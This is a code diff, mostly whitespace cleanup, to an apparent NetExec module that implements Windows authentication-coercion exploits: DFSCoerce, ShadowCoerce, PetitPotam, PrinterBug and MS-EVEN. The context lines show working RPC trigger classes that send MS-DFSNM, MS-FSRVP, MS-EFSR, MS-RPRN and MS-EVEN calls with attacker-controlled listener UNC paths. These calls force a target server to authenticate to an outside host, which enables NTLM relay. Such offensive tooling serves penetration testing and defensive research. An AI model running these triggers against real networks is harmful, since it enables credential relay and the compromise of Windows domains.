@@ -71,7 +71,7 @@ class NXCModule:
             except Exception as e:
                 context.log.error(f"Error in DFSCoerce module: {e}")
             """ DFSCOERCE END """
-        
+
         if self.method == "all" or self.method[:1] == "s":  # ShadowCoerce
             runmethod = True
             """ ShadowCoerce START """
@@ -102,8 +102,7 @@ class NXCModule:
             except Exception as e:
                 context.log.error(f"Error in ShadowCoerce module: {e}")
             """ ShadowCoerce END """
-        
-      
+
         if self.method == "all" or self.method[:2] == "pe":  # PetitPotam
             runmethod = True
             """ PETITPOTAM START """
@@ -141,13 +140,12 @@ class NXCModule:
                         context.log.debug("Target is not vulnerable to PetitPotam")
                 except Exception as e:
                     context.log.error(f"Error in PetitPotam module: {e}")
-            
             """ PETITPOTAM END """
-        
+
         if self.method == "all" or self.method[:2] == "pr":  # PrinterBug
             runmethod = True
             """ PRINTERBUG START """
-            try: 
+            try:
                 printerbugclass = PrinterBugTrigger(context)
                 target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                 printerbugconnect = printerbugclass.connect(
@@ -174,7 +172,7 @@ class NXCModule:
             except Exception as e:
                 context.log.error(f"Error in PrinterBug module: {e}")
             """ PRINTERBUG END """
-         
+
         if self.method == "all" or self.method[:1] == "m":  # MSEven
             runmethod = True
             """ MSEVEN START """
@@ -208,15 +206,12 @@ class NXCModule:
         if not runmethod:
             context.log.error("Invalid method, please check the method name.")
             return
-        
-
 
 
 class ShadowCoerceTrigger:
-    
     def __init__(self, context):
         self.context = context
-        
+
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "Fssagentrpc": {
@@ -256,7 +251,6 @@ class ShadowCoerceTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-      
         self.context.log.debug("Sending IsPathShadowCopied!")
         try:
             request = IsPathShadowCopied()
@@ -270,8 +264,7 @@ class ShadowCoerceTrigger:
                     return True
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-                
-                
+
         self.context.log.debug("Sending IsPathSupported!")
         try:
             request = IsPathSupported()
@@ -287,10 +280,10 @@ class ShadowCoerceTrigger:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
 
-
-
 class NetrDfsAddStdRootForcedResponse(NDRCALL):
     structure = ()
+
+
 class NetrDfsAddStdRootForced(NDRCALL):
     opnum = 15
     structure = (
@@ -303,34 +296,37 @@ class NetrDfsAddStdRootForced(NDRCALL):
 
 class NetrDfsRemoveRootTargetResponse(NDRCALL):
     structure = ()
+
+
 class NetrDfsRemoveRootTarget(NDRCALL):
     opnum = 24
     structure = (
         ("pDfsPath", LPWSTR),  # Type: LPWSTR
-        ("pTargetPath", LPWSTR),  # Type: LPWSTR 
+        ("pTargetPath", LPWSTR),  # Type: LPWSTR
         ("Flags", ULONG),  # Type: ULONG
     )
-    
+
 
 class NetrDfsAddRootTargetResponse(NDRCALL):
     structure = ()
+
+
 class NetrDfsAddRootTarget(NDRCALL):
     opnum = 23
     structure = (
         ("pDfsPath", LPWSTR),  # Type: LPWSTR
-        ("pTargetPath", LPWSTR),  # Type: LPWSTR 
+        ("pTargetPath", LPWSTR),  # Type: LPWSTR
         ("MajorVersion", ULONG),  # Type: ULONG
         ("pComment", LPWSTR),  # Type: LPWSTR
         ("NewNamespace", BOOL),  # Type: BOOLEAN
         ("Flags", ULONG),  # Type: ULONG
     )
-    
-    
+
+
 class DFSCoerceTrigger:
-    
     def __init__(self, context):
         self.context = context
-        
+
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "netdfs": {
@@ -370,9 +366,7 @@ class DFSCoerceTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-      
-      
-      
+
         self.context.log.debug("Sending NetrDfsAddStdRootForced!")
         try:
             request = NetrDfsAddStdRootForced()
@@ -398,9 +392,8 @@ class DFSCoerceTrigger:
             elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
                 self.context.log.debug("Not Vulnerable")
             else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")    
-                
-    
+                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+
         self.context.log.debug("Sending NetrDfsAddRootTarget!")
         try:
             request = NetrDfsAddRootTarget()
@@ -415,7 +408,7 @@ class DFSCoerceTrigger:
             """
             request["pDfsPath"] = f"\\\\{listener}\\a\x00"
             request["pTargetPath"] = NULL
-            request["MajorVersion"] = 0 
+            request["MajorVersion"] = 0
             request["pComment"] = "lodos\x00"
             request["NewNamespace"] = 0
             request["Flags"] = 0
@@ -431,8 +424,8 @@ class DFSCoerceTrigger:
             elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
                 self.context.log.debug("Not Vulnerable")
             else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")    
-        
+                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+
         # Private exploit
         self.context.log.debug("Sending NetrDfsRemoveRootTarget!")
         try:
@@ -456,8 +449,8 @@ class DFSCoerceTrigger:
                 if not always_continue:
                     return True
             else:
-                self.context.log.debug(f"Something went wrong, check error status => {e!s}")    
-        
+                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+
         self.context.log.debug("Sending NetrDfsManagerInitialize!")
         try:
             request = NetrDfsManagerInitialize()
@@ -480,8 +473,7 @@ class DFSCoerceTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-                
-                
+
         self.context.log.debug("Sending NetrDfsManagerInitialize!")
         try:
             request = NetrDfsManagerInitialize()
@@ -504,8 +496,7 @@ class DFSCoerceTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.highlight(f"Something went wrong, check error status => {e!s}")
-                
-                
+
         self.context.log.debug("Sending NetrDfsAddStdRoot!")
         try:
             request = NetrDfsAddStdRoot()
@@ -522,8 +513,7 @@ class DFSCoerceTrigger:
                     return True
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-                
-                
+
         self.context.log.debug("Sending NetrDfsRemoveStdRoot!")
         try:
             request = NetrDfsRemoveStdRoot()
@@ -539,6 +529,7 @@ class DFSCoerceTrigger:
                     return True
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+
 
 class PetitPotamtTrigger:
     def __init__(self, context):
@@ -567,7 +558,7 @@ class PetitPotamtTrigger:
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
         }
-        
+
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         rpctransport.set_dport(445)
 
@@ -602,7 +593,6 @@ class PetitPotamtTrigger:
 
     def exploit(self, dce, listener, always_continue, pipe):
 
-        
         self.context.log.debug("Sending EfsRpcAddUsersToFile!")
         try:
             request = EfsRpcAddUsersToFile()
@@ -618,8 +608,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
-        
+
         self.context.log.debug("Sending EfsRpcAddUsersToFileEx!")
         try:
             request = EfsRpcAddUsersToFileEx()
@@ -636,8 +625,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
-        
+
         self.context.log.debug("Sending EfsRpcDecryptFileSrv!")
         try:
             request = EfsRpcDecryptFileSrv()
@@ -654,7 +642,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
+
         self.context.log.debug("Sending EfsRpcDuplicateEncryptionInfoFile!")
         try:
             request = EfsRpcDuplicateEncryptionInfoFile()
@@ -675,7 +663,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
+
         self.context.log.debug("Sending EfsRpcEncryptFileSrv!")
         try:
             request = EfsRpcEncryptFileSrv()
@@ -691,9 +679,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
-        
-        
+
         self.context.log.debug("Sending EfsRpcEncryptFileSrv!")
         try:
             request = EfsRpcEncryptFileSrv()
@@ -709,8 +695,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
-        
+
         self.context.log.debug("Sending EfsRpcFileKeyInfo!")
         try:
             request = EfsRpcFileKeyInfo()
@@ -727,7 +712,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
+
         self.context.log.debug("Sending EfsRpcQueryRecoveryAgents!")
         try:
             request = EfsRpcQueryRecoveryAgents()
@@ -743,8 +728,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
-        
+
         self.context.log.debug("Sending EfsRpcQueryUsersOnFile!")
         try:
             request = EfsRpcQueryUsersOnFile()
@@ -760,8 +744,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
-        
+
         self.context.log.debug("Sending EfsRpcRemoveUsersFromFile!")
         try:
             request = EfsRpcRemoveUsersFromFile()
@@ -777,7 +760,7 @@ class PetitPotamtTrigger:
                 self.context.log.debug("Not Vulnerable")
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
-        
+
         self.context.log.debug("Sending EfsRpcOpenFileRaw!")
         try:
             request = EfsRpcOpenFileRaw()
@@ -796,17 +779,18 @@ class PetitPotamtTrigger:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
         return False
 
+
 class PrinterBugTrigger:
     def __init__(self, context):
         self.context = context
 
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
-              "spoolss": {
-                  "stringBinding": r"ncacn_np:%s[\PIPE\spoolss]" % target,
-                  "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
-              },
-          }
+            "spoolss": {
+                "stringBinding": r"ncacn_np:%s[\PIPE\spoolss]" % target,
+                "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
+            },
+        }
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         rpctransport.set_dport(445)
 
@@ -840,9 +824,7 @@ class PrinterBugTrigger:
         return dce
 
     def exploit(self, dce, listener, target, always_continue, pipe):
-      
-            
-   
+
         try:
             resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
         except Exception as e:
@@ -887,7 +869,7 @@ class PrinterBugTrigger:
                 # We're not admin, bye
                 self.context.log.debug("Access denied - RPC call was denied")
                 return None
-        
+
         self.context.log.debug("Got Handle")
         try:
             # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
@@ -909,11 +891,12 @@ class PrinterBugTrigger:
             else:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
+
 class MSEvenTrigger:
-    
+
     def __init__(self, context):
         self.context = context
-        
+
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "eventlog": {
@@ -952,7 +935,7 @@ class MSEvenTrigger:
         return dce
 
     def exploit(self, dce, listener, always_continue, pipe):
-      
+
         self.context.log.debug("Sending ElfrOpenBELW!")
         try:
             request = even.ElfrOpenBELW()
@@ -973,8 +956,6 @@ class MSEvenTrigger:
                 self.context.log.debug(f"Something went wrong, check error status => {e!s}")
 
 
-    
-
 class IsPathShadowCopied(NDRCALL):
     """Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol"""
     opnum = 9
@@ -986,7 +967,8 @@ class IsPathShadowCopied(NDRCALL):
 class IsPathShadowCopiedResponse(NDRCALL):
     """Structure to parse the response of the RPC call to IsPathShadowCopied() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
     structure = ()
-    
+
+
 class IsPathSupported(NDRCALL):
     """Structure to make the RPC call to IsPathSupported() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
     opnum = 8
@@ -998,23 +980,30 @@ class IsPathSupported(NDRCALL):
 class IsPathSupportedResponse(NDRCALL):
     """Structure to parse the response of the RPC call to IsPathSupported() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
     structure = ()
-    
+
 
 class PRINTER_HANDLE(NDRSTRUCT):
     structure = (
         ("Data", '20s=b""'),
     )
+
     def getAlignment(self):
         if self._isNDR64 is True:
             return 8
         else:
             return 4
+
+
 class USHORT_ARRAY(NDRUniConformantArray):
     item = "<H"
+
+
 class PUSHORT_ARRAY(NDRPOINTER):
     referent = (
         ("Data", USHORT_ARRAY),
     )
+
+
 class RPC_V2_NOTIFY_OPTIONS_TYPE(NDRSTRUCT):
     structure = (
         ("Type", USHORT),
@@ -1025,10 +1014,13 @@ class RPC_V2_NOTIFY_OPTIONS_TYPE(NDRSTRUCT):
         ("pFields", PUSHORT_ARRAY),
     )
 
+
 class PRPC_V2_NOTIFY_OPTIONS_TYPE_ARRAY(NDRPOINTER):
     referent = (
         ("Data", RPC_V2_NOTIFY_OPTIONS_TYPE),
     )
+
+
 class RPC_V2_NOTIFY_OPTIONS(NDRSTRUCT):
     structure = (
         ("Version", DWORD),
@@ -1036,24 +1028,30 @@ class RPC_V2_NOTIFY_OPTIONS(NDRSTRUCT):
         ("Count", DWORD),
         ("pTypes", PRPC_V2_NOTIFY_OPTIONS_TYPE_ARRAY),
     )
+
+
 class PRPC_V2_NOTIFY_OPTIONS(NDRPOINTER):
     referent = (
         ("Data", RPC_V2_NOTIFY_OPTIONS),
     )
+
+
 class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
     opnum = 62
     structure = (
-       ("hPrinter", PRINTER_HANDLE),
-       ("fdwFlags", DWORD),
-       ("fdwOptions", DWORD),
-       ("pszLocalMachine", LPWSTR),
-       ("dwPrinterLocal", DWORD),
-       ("cbBuffer", DWORD),
-       ("pBuffer", LPBYTE),
+        ("hPrinter", PRINTER_HANDLE),
+        ("fdwFlags", DWORD),
+        ("fdwOptions", DWORD),
+        ("pszLocalMachine", LPWSTR),
+        ("dwPrinterLocal", DWORD),
+        ("cbBuffer", DWORD),
+        ("pBuffer", LPBYTE),
     )
-    
+
+
 class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
     structure = ()
+
 
 class EfsRpcOpenFileRaw(NDRCALL):
     """Structure to make the RPC call to EfsRpcOpenFileRaw() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
@@ -1067,7 +1065,7 @@ class EfsRpcOpenFileRaw(NDRCALL):
 class EfsRpcOpenFileRawResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcOpenFileRaw() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
-    
+
 
 class EfsRpcEncryptFileSrv(NDRCALL):
     """Structure to make the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
@@ -1076,11 +1074,13 @@ class EfsRpcEncryptFileSrv(NDRCALL):
         ("FileName", WSTR),  # Type: wchar_t *
     )
 
+
 class EFS_HASH_BLOB(NDRSTRUCT):
     structure = (
         ("Data", DWORD),
         ("cbData", PCHAR),
     )
+
 
 class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
     structure = (
@@ -1088,12 +1088,16 @@ class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
         ("SID", RPC_SID),
         ("Hash", EFS_HASH_BLOB),
         ("Display", LPWSTR),
-    )  
+    )
+
+
 class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
     structure = (
         ("nUsers", DWORD),
         ("Users", ENCRYPTION_CERTIFICATE_HASH),
     )
+
+
 class EfsRpcAddUsersToFile(NDRCALL):
     """Structure to make the RPC call to EfsRpcAddUsersToFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/afd56d24-3732-4477-b5cf-44cc33848d85)"""
     opnum = 9
@@ -1101,16 +1105,19 @@ class EfsRpcAddUsersToFile(NDRCALL):
         ("FileName", WSTR),   # Type: wchar_t *
         ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST)
     )
+
+
 class EfsRpcAddUsersToFileResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
+
 
 class EfsRpcAddUsersToFileEx(NDRCALL):
     opnum = 15
     structure = (
         ("dwFlags", DWORD),    # Type: DWORD
         # Accroding to this page: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
-        # Reserved must be set to NULL 
+        # Reserved must be set to NULL
         ("Reserved", NDRPOINTERNULL),   # Type: NDRPOINTERNULL *
         ("FileName", WSTR),    # Type: wchar_t *
         ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),  # Type: ENCRYPTION_CERTIFICATE_LIST *
@@ -1120,12 +1127,14 @@ class EfsRpcAddUsersToFileEx(NDRCALL):
 class EfsRpcAddUsersToFileExResponse(NDRCALL):
     structure = ()
 
+
 class EFS_RPC_BLOB(NDRSTRUCT):
     structure = (
         ("Data", DWORD),
         ("cbData", PCHAR),
     )
-    
+
+
 class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
     """Structure to make the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     opnum = 13
@@ -1141,12 +1150,13 @@ class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
 
 class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
-    structure = () 
-    
+    structure = ()
+
 
 class EfsRpcEncryptFileSrvResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
+
 
 class EfsRpcFileKeyInfo(NDRCALL):
     """Structure to make the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
@@ -1161,6 +1171,7 @@ class EfsRpcFileKeyInfoResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
 
+
 class EfsRpcQueryRecoveryAgents(NDRCALL):
     """Structure to make the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     opnum = 7
@@ -1172,7 +1183,8 @@ class EfsRpcQueryRecoveryAgents(NDRCALL):
 class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
-        
+
+
 class EfsRpcQueryUsersOnFile(NDRCALL):
     """Structure to make the RPC call to EfsRpcQueryUsersOnFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     opnum = 6
@@ -1184,6 +1196,8 @@ class EfsRpcQueryUsersOnFile(NDRCALL):
 class EfsRpcQueryUsersOnFileResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcQueryUsersOnFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
+
+
 class EfsRpcDecryptFileSrv(NDRCALL):
     """Structure to make the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     opnum = 5
@@ -1196,14 +1210,16 @@ class EfsRpcDecryptFileSrv(NDRCALL):
 class EfsRpcDecryptFileSrvResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
-       
+
+
 class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
     align = 1
     structure = (
         ("Cert", DWORD),
         ("Users", ENCRYPTION_CERTIFICATE_HASH),
     )
-    
+
+
 class EfsRpcRemoveUsersFromFile(NDRCALL):
     """Structure to make the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/28609dad-5fa5-4af9-9382-18d40e3e9dec)"""
     opnum = 8
@@ -1212,10 +1228,11 @@ class EfsRpcRemoveUsersFromFile(NDRCALL):
         ("Users", ENCRYPTION_CERTIFICATE_HASH_LIST)
     )
 
+
 class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
-    
+
 
 class NetrDfsManagerInitialize(NDRCALL):
     opnum = 14
@@ -1223,9 +1240,12 @@ class NetrDfsManagerInitialize(NDRCALL):
         ("ServerName", WSTR),  # Type: WCHAR *
         ("Flags", DWORD),  # Type: DWORD
     )
+
+
 class NetrDfsManagerInitializeResponse(NDRCALL):
     structure = ()
-    
+
+
 class NetrDfsAddStdRoot(NDRCALL):
     """Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol"""
     opnum = 12
@@ -1236,9 +1256,11 @@ class NetrDfsAddStdRoot(NDRCALL):
         ("ApiFlags", DWORD),   # Type: DWORD
     )
 
+
 class NetrDfsAddStdRootResponse(NDRCALL):
     """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
     structure = ()
+
 
 class NetrDfsRemoveStdRoot(NDRCALL):
     """Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
